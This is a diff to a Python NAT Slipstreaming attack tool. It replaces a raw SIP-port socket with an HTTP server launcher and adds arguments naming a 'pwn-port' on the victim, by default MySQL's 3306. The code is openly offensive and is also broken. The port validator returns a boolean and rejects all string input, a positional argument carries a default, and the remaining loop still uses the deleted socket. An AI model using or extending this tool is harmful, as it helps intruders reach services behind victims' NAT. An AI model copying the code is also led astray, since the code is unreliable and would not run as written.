@@ -8,9 +8,26 @@ from http.server import ThreadingHTTPServer
 from handler import Handler
 from argparse import ArgumentParser
 
-s = socket(AF_INET,SOCK_STREAM)
-s.bind(("",5060)) 
-s.listen()
+
+def run(listen_port, pwn_port):
+	Handler.port_num = pwn_port
+	httpd = ThreadingHTTPServer(('', listen_port), Handler)
+	httpd.serve_forever()
+
+
+def port(num):
+	if isinstance(num, int):
+		return 1 <= num <= 65535
+	return False
+
+
+def get_args():
+	parser = ArgumentParser(description='NAT Slipstreaming via Python')
+	parser.add_argument('pwn-port', help='Port on the victim to connect to', type=port, default=3306)
+	parser.add_argument('-l', '--listen-port', help='Port for the HTTP server to listen on.', default=8080, type=port)
+
+	return parser.parse_args()
+
 
 while True:
     con, client = s.accept()
